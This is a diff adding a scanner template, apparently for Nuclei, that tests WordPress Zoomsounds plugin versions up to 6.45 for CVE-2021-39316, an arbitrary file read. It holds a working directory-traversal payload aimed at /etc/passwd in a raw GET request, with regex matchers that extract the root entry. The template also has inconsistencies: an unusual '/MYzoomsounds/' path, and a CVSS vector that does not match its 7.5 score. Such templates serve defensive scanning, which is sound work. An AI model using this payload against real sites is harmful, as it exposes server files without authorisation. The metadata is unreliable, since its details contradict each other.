@@ -1,0 +1,38 @@
+id: wordpress-zoomsounds-arbitrary-file-read
+
+info:
+  name: Wordpress Zoomsounds Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The WordPress Zoomsounds plugin allows an arbitrary file reading vulnerability in versions <= 6.45. The dzsap_download operation can use the link parameter for directory traversal, enabling download of sensitive files such as wp-config.php.
+  reference:
+    - https://www.exploit-db.com/exploits/50564
+  classification:
+    cve-id: CVE-2021-39316
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 7.5
+
+variables:
+  filepath: '../../../../../../../../../../etc/passwd'
+
+http:
+  - raw:
+      - |
+        GET /MYzoomsounds/?action=dzsap_download&link={{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:(.*?):0:0:"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:(.*?):0:0:"
